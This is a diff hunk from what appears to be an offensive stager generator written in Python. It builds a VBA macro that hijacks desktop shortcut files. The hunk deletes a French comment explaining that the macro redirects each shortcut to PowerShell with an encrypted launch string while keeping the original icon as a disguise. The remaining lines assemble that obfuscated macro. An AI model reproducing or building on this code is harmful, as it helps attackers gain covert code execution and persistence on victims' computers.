@@ -155,8 +155,6 @@ xmlVar = ''.join(random.sample(string.ascii_uppercase + string.ascii_lowercase, 
             for chunk in chunks[1:]:
                 macro += blockVar + " = " + blockVar + " + \"" + str(chunk) + "\"\n"
 
-
-	    #une partie de la macro qui modifie effectivement les fichiers LNK sur le bureau, définit l'iconlocation de lnk mis à jour vers l'ancien chemin cible, les args vers notre code de lancement, et la cible vers powerhell afin que nous puissions l'appeler directement
 	    macro += lnkVar +".IconLocation = " + lnkVar + ".targetpath\n"
 	    launchString = fncDecryptName + "(\"" + self.encoder(launchString1) + "\")" + launchString2 + fncDecryptName + "(" + blockVar + ")\n"
 	    macro += lnkVar + ".arguments = " + launchString
